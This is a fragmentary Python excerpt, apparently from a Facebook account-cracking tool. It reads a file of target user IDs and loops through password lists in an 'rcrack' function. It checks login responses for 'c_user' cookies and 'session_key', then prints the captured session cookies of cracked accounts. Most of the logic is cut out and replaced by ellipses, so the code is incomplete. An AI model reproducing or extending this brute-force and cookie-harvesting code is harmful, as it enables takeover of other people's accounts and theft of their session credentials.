...
def file():
    ...
    print(logo)
    print(arafat.mahdilinx())
    filex=input(f'{arafat.LI_GREEN}Input OK Ids File :{arafat.LI_YELLOW}')
    try:
        idsfile=open(filex,'r').read().splitlines()
    except:
        print(f'{arafat.LI_RED}Fast Input File')
        print(arafat.mahdilinx())
        time.sleep(3)
        file()
    print(arafat.linex())
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\r {random.choice(arafat.mycolor)}[{random.choice(arafat.mycolor)}={random.choice(arafat.mycolor)}]~[{random.choice(arafat.mycolor)}SAAD~M2{W}]~[{random.choice(arafat.mycolor)}OK|CP{random.choice(arafat.mycolor)}{random.choice(arafat.mycolor)}]~[{len(cracked)}]~[{random.choice(arafat.mycolor)}{tl}]~[{random.choice(arafat.mycolor)}{G}{random.choice(arafat.mycolor)}{len(oks)}{W}|{random.choice(arafat.mycolor)}{R}{random.choice(arafat.mycolor)}{len(cps)}{W}{random.choice(arafat.mycolor)}] ');sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid=mahdiid[0:15]#;arafat.flw(coki)
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    ...
                    if 'y' in mahdi_coki:
                        print(f'{Bl}COOKIS :{arafat.LI_GREEN}{cookie}')
                    oks.append(uidX)
